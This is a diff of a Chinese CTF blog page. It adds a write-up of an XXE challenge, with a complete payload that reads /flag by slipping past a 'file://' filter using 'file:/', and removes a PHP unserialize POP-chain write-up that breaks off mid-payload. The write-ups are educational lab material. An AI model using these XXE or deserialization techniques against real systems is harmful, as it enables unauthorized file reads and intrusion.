@@ -2263,6 +2263,8 @@
       
         
       
+        
+      
     
     
     
@@ -2628,6 +2630,36 @@
     
   
     RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/redis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redis
   
 
     
@@ -3717,6 +3749,177 @@
       <header class="md-typeset">
         <h1 id="wp">WP 博客<a class="headerlink" href="#wp" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-19 18:45:00+00:00">2026-11-19</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/xxe/" class="md-meta__link">XXE</a>, 
+              <a href="../../category/web/" class="md-meta__link">Web</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="flag"><a class="toclink" href="../../myctf-xxe-shi-jian/">海棠诗社·诗笺夹带 — 誊录官一字不改，那就把 flag 塞进诗里</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：XXE（XML 外部实体注入）— 绕过 <code>file://</code> 过滤</p>
+<p><strong>Flag</strong>：<code>MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../myctf-xxe-shi-jian/#_1">题目概述</a></h3>
+<p>题目背景写得很讲究：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
+</span></code></pre></div>
+<p><strong>“笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会</strong>原样解析并回显<strong>你提交的 XML。</strong></p>
+<p><strong>而那面小旗（flag）就在它案头，也就是 <code>/flag</code> 文件。</strong></p>
+<p><strong>所以思路很清楚：让 XML 解析器自己去读 <code>/flag</code>，再把内容抄给我。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../myctf-xxe-shi-jian/#_2">解题过程</a></h3>
+<h4 id="step-1-js"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-1-js">Step 1：先看 JS，找到提交入口</a></h4>
+<p><strong>页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span><span class="p">})</span>
+</span></code></pre></div>
+<p><strong>三件事一眼看清：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>接口      POST /tengchao
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>类型      application/xml
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>请求体    输入框 #x 里的全部内容，原样提交
+</span></code></pre></div>
+<p><strong>也就是说：输入框里写什么 XML，服务器就拿什么去解析。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-2">Step 2：先确认后端语言（这一步很重要）</a></h4>
+<p><strong>我第一反应是 PHP 环境，于是去试 <code>php://filter</code>。</strong></p>
+<p><strong>结果报错里的堆栈信息显示是</strong>Java<strong>。</strong></p>
+<p><strong>这一步的价值：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>报错暴露语言 → 决定用哪套绕过思路
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>PHP  的伪协议        php://filter、php://input
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
+</span></code></pre></div>
+<p><strong>很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于</strong>解析器是谁<strong>。</strong></p>
+<h4 id="step-3file-java"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-3file-java">Step 3：<code>file://</code> 被过滤，但 Java 不认这个死理</a></h4>
+<p><strong>直接写 <code>file:///flag</code>，被拦了——代码里过滤了 <code>file://</code> 这个字符串。</strong></p>
+<p><strong>但 Java 的 XML 解析器在解析 <code>SYSTEM</code> 后面的值时，是按 <strong>URI</strong> 处理的，对斜杠数量并不敏感：</strong></p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
+</span></code></pre></div>
+<p><strong>所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。</strong>它以为外部实体只有 <code>file://</code> 一种形态。</p>
+<h4 id="step-4-payload"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-4-payload">Step 4：写 payload</a></h4>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+</span></code></pre></div>
+<p><strong>三部分缺一不可：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>③ 保留原有的结构
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
+</span></code></pre></div>
+<p><strong>最容易漏的是第 ②：</strong>只声明实体、不引用，服务器什么都不会给你。**</p>
+<h4 id="step-5"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-5">Step 5：提交，读结果</a></h4>
+<p><strong>把整段 XML 填进输入框，点提交。</strong></p>
+<p><strong>“誊抄入册”那块原样回显了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>落款：
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>出浴太真冰作影
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>捧心西子玉为魂
+</span></code></pre></div>
+<p><strong>因为 <code>&amp;x;</code> 在解析时被替换成了 <code>/flag</code> 文件的内容。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>入口</td>
+<td><code>POST /tengchao</code>，<code>Content-Type: application/xml</code>，body 完全可控</td>
+</tr>
+<tr>
+<td>判断语言</td>
+<td><code>php://filter</code> 报错 → 堆栈显示 Java</td>
+</tr>
+<tr>
+<td>Java 的宽松</td>
+<td><code>SYSTEM</code> 的值按 URI 解析，<code>file:/</code>、<code>/flag</code> 都能用</td>
+</tr>
+<tr>
+<td>过滤的误判</td>
+<td>只过滤了 <code>file://</code> 这个字符串，没想到还有别的写法</td>
+</tr>
+<tr>
+<td>XXE 三要素</td>
+<td>声明实体 → <strong>引用实体</strong> → 保持原结构走到回显</td>
+</tr>
+<tr>
+<td>文件路径</td>
+<td><code>/flag</code>（题目描述里直接给了）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整 payload</summary>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 只声明实体，不在正文引用</strong></p>
+<p><code>&lt;!ENTITY x SYSTEM "..."&gt;</code> 只是“登记”，<strong>解析器不会主动去读</strong>。必须在正文里写 <code>&amp;x;</code> 才会触发读取和替换。</p>
+<p><strong>② 被 <code>file://</code> 拦住就放弃</strong></p>
+<p>过滤的是<strong>字符串</strong>，不是<strong>语义</strong>。<code>file:/</code>、<code>file:</code>、直接写绝对路径，都能达到同一个效果。</p>
+<p><strong>③ 没先判断后端语言</strong></p>
+<p>PHP 的 <code>php://filter</code> 在 Java 里当然报错。<strong>报错本身就是信息</strong>——它告诉你该换哪一套思路。</p>
+<p><strong>④ 改了 XML 结构</strong></p>
+<p>服务器的模板要求特定标签（<code>&lt;题名&gt;</code>、<code>&lt;句&gt;</code>），<strong>结构改坏就走不到回显那一步</strong>，哪怕实体读到了也没用。</p>
+</details>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5568,241 +5771,6 @@
 <p><strong>那是 PHP 语法。HTTP 里是 <code>_SESSION[flag]=</code>。</strong></p>
 <p><strong>④ 以为数组有 3 个元素</strong></p>
 <p><strong><code>extract</code> 是整体替换，<code>user</code>/<code>function</code> 早没了，只剩 2 个。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-03 19:05:00+00:00">2026-11-03</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/php/" class="md-meta__link">PHP</a>, 
-              <a href="../../category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
-              <a href="../../category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="newstarctf-unserializeone"><a class="toclink" href="../../newstarctf-unserializeone/">[NewStarCTF] UnserializeOne — 五个魔术方法串成一条链</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：PHP 反序列化 — POP 链构造（魔术方法连环触发）</p>
-<p><strong>Flag</strong>：<code>CTF2{a3ae15bd-2047-4dd5-b9b3-c0dccb22c632}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="../../newstarctf-unserializeone/#_1">题目概述</a></h3>
-<p>给一份源码，入口就一句：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="x">if(isset($_POST['pop'])){</span>
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="x">    unserialize($_POST['pop']);</span>
-</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong>四个类：<code>Start</code>、<code>Sec</code>、<code>Easy</code>、<code>eeee</code>，各带魔术方法。任务是拼一条从 <code>unserialize</code> 走到 <code>file_get_contents('/flag')</code> 的链。</strong></p>
-<hr />
-<h3 id="_2"><a class="toclink" href="../../newstarctf-unserializeone/#_2">解题过程</a></h3>
-<h4 id="step-1flag"><a class="toclink" href="../../newstarctf-unserializeone/#step-1flag">Step 1：先找终点——flag 在哪被读出来</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="x">class Sec{</span>
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="x">    public function __invoke()</span>
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="x">    {</span>
-</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="x">        echo file_get_contents('/flag');</span>
-</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="x">    }</span>
-</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong>终点在 <code>Sec::__invoke()</code>。</strong></p>
-<p><strong><code>__invoke</code> 的触发条件：</strong>把一个对象当成函数来调用<strong>，也就是 <code>$obj()</code>。</strong></p>
-<h4 id="step-2"><a class="toclink" href="../../newstarctf-unserializeone/#step-2">Step 2：谁会把对象当函数调用</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="x">class Start{</span>
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="x">    public function __isset($var)</span>
-</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="x">    {</span>
-</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="x">        ($this-&gt;func)();</span>
-</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="x">    }</span>
-</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong><code>($this-&gt;func)()</code> —— 这就是“把 <code>$this-&gt;func</code> 当函数调用”。只要 <code>$this-&gt;func</code> 是一个 <code>Sec</code> 对象，就会走到 <code>Sec::__invoke</code>。</strong></p>
-<p><strong>所以现在要找：</strong><code>__isset</code> 怎么被触发<strong>。</strong></p>
-<p><strong><code>__isset</code> 的触发条件：</strong>对不可访问或不存在的属性调用 <code>isset()</code>（或 <code>empty()</code>）<strong>。</strong></p>
-<h4 id="step-3-isset"><a class="toclink" href="../../newstarctf-unserializeone/#step-3-isset">Step 3：谁会对不存在的属性调用 isset</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="x">class eeee{</span>
-</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="x">    public $obj;</span>
-</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="x">    public function __clone()</span>
-</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="x">    {</span>
-</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="x">        if(isset($this-&gt;obj-&gt;cmd)){</span>
-</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="x">            echo "success";</span>
-</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a><span class="x">        }</span>
-</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="x">    }</span>
-</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong><code>isset($this-&gt;obj-&gt;cmd)</code> —— 如果 <code>$this-&gt;obj</code> 是个 <code>Start</code> 对象，而 <code>Start</code> 里没有 <code>cmd</code> 这个属性，</strong>这就是“对不存在的属性调用 isset”<strong>，正好触发 <code>Start::__isset</code>。</strong></p>
-<p><strong>所以 <code>eeee-&gt;obj</code> 要指向一个 <code>Start</code>，而那个 Start 的 <code>func</code> 要指向一个 <code>Sec</code>。</strong></p>
-<p><strong>下一个问题：<code>__clone</code> 怎么触发？</strong></p>
-<h4 id="step-4-clone"><a class="toclink" href="../../newstarctf-unserializeone/#step-4-clone">Step 4：谁在 clone 对象</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="x">class Easy{</span>
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="x">    public $cla;</span>
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="x">    public function __call($fun, $var)</span>
-</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="x">    {</span>
-</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="x">        $this-&gt;cla = clone $var[0];</span>
-</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="x">    }</span>
-</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong><code>clone $var[0]</code> —— 直接触发被 clone 对象的 <code>__clone</code>。</strong></p>
-<p><strong><code>__call</code> 的触发条件：</strong>调用了对象上不存在的方法<strong>。</strong></p>
-<h4 id="step-5"><a class="toclink" href="../../newstarctf-unserializeone/#step-5">Step 5：谁调用了不存在的方法</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">class Sec{</span>
-</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="x">    public function __toString()</span>
-</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="x">    {</span>
-</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="x">        $this-&gt;obj-&gt;check($this-&gt;var);</span>
-</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="x">        return "CTFers";</span>
-</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="x">    }</span>
-</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong><code>$this-&gt;obj-&gt;check($this-&gt;var)</code> —— <code>check</code> 这个方法四个类里都没有，所以只要 <code>$this-&gt;obj</code> 是 <code>Easy</code>，就会触发 <code>Easy::__call</code>，</strong>而且第一个参数正好是 <code>$this-&gt;var</code><strong>（也就是我们要 clone 的那个 <code>eeee</code> 对象）。</strong></p>
-<p><strong><code>__toString</code> 的触发条件：</strong>对象被当成字符串使用<strong>。</strong></p>
-<h4 id="step-6"><a class="toclink" href="../../newstarctf-unserializeone/#step-6">Step 6：谁把对象当字符串用了</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="x">class Start{</span>
-</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="x">    public function __destruct()</span>
-</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="x">    {</span>
-</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="x">        echo "Welcome to NewStarCTF, ".$this-&gt;name;</span>
-</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="x">    }</span>
-</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong>字符串拼接 <code>"..." . $this-&gt;name</code> —— 如果 <code>$this-&gt;name</code> 是个 <code>Sec</code> 对象，就会触发 <code>Sec::__toString</code>。</strong></p>
-<p><strong>而 <code>__destruct</code> 是</strong>对象被销毁时自动调用<strong>——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。</strong></p>
-<hr />
-<h3 id="_3"><a class="toclink" href="../../newstarctf-unserializeone/#_3">完整链条</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>unserialize 结束、脚本运行完毕
-</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>  → Start::__destruct()            对象销毁自动触发
-</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>    → 字符串拼接 $this-&gt;name
-</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>      → Sec::__toString()          对象被当字符串用
-</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>        → $this-&gt;obj-&gt;check(...)   调用不存在的方法
-</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>          → Easy::__call()         不存在的方法被调用
-</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>            → clone $var[0]        克隆对象
-</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>              → eeee::__clone()    对象被 clone
-</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>                → isset($this-&gt;obj-&gt;cmd)   不存在的属性
-</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>                  → Start::__isset()       对不存在的属性 isset
-</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>                    → ($this-&gt;func)()      对象当函数调用
-</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>                      → Sec::__invoke()    对象当函数
-</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>                        → file_get_contents('/flag')
-</span></code></pre></div>
-<p><strong>五个魔术方法，一层扣一层，最后落在读文件上。</strong></p>
-<hr />
-<h3 id="payload"><a class="toclink" href="../../newstarctf-unserializeone/#payload">Payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>O:5:"Start":2:{
